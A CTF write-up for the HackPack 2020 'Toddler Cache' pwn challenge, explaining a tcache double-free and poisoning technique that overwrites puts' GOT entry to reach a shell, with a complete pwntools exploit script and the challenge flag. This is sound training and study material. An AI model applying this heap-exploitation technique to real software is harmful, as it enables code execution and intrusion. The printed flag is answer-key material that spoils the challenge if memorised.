<h1>Toddler Cache</h1>
<h2>HackPack CTF 2020 PWN</h2>

<h3>Problem:</h3>
"Welcome to ToddlerCache (t-cache for short)"

<h3>Solution:</h3>
Based on the problem, this is going to be a tcachebin exploit.  After decompiling and running a few tests through gdb we can see that this is a double free (and use after free) tcachebin vulnerability.  The goal is clearly laid out when we come across the function call_me.  The tcache vulnerability will allow us to perform arbitrary writes.  Another thing to note is no PIE so we can easily use instructions on the text segment.

First we can allocate two entries and use vis to take a look at the chunks.

![Image of Vis01](https://github.com/h3lpful/ctf_writeups/blob/master/toddler_cache/images/vis01.png)

Then we can perform a double free, since tcache only makes sure you dont free the same chunk twice in a row, we will free 1, then 0, then 1.

![Image of Vis02](https://github.com/h3lpful/ctf_writeups/blob/master/toddler_cache/images/vis02.png)

Notice how each of these heap chunks are pointing to each other.  tcache stores the location of the next chunk to be allocated in itself, and since they are both pointing to each other we can now write a memory location in the lower one.  We can choose the current location of puts on the plt (0x602020) and write it to chunk 1 with the write_entry function.

![Image of Vis03](https://github.com/h3lpful/ctf_writeups/blob/master/toddler_cache/images/vis03.png)

Now we can make 2 new entries, write to entry 3 (the newest one allocated at 0x602020) and write the address of call_me (0x400837)

![Image of puts](https://github.com/h3lpful/ctf_writeups/blob/master/toddler_cache/images/puts.png)

Now when the function tries to call puts we will get a shell.  Here is the exploit I used.

```Python3

from pwn import *

target = './toddler_cache'

#context.log_level = 'error'
context.update(terminal = ['tmux','splitw'])

#==========================================================
#           FUNCTIONS
#==========================================================

def newEntry():
    p.recvuntil('>')
    p.sendline('1')

def writeEntry(eid, entry):
    p.recvuntil('>')
    p.sendline('2')
    p.recvuntil('write to')
    p.sendline(eid)
    p.recvuntil('write?')
    p.sendline(entry)

def freeEntry(eid):
    p.recvuntil('>')
    p.sendline('3')
    p.sendline(eid)

#==========================================================
#           CODE
#==========================================================

p = process(target, env={"LD_PRELOAD":"./glibc_versions/libc-2.26.so"})

#p = remote('cha.hackpack.club',41703)

gdb.attach(p)

newEntry()
newEntry()

freeEntry('1')
freeEntry('0')
freeEntry('1')


writeEntry('1', p64(0x602020))

newEntry()
newEntry()

writeEntry('3', p64(0x400837))

p.interactive()

```
flag{n0w_th4ts_a_p0is0n3d_t_c4ch3}
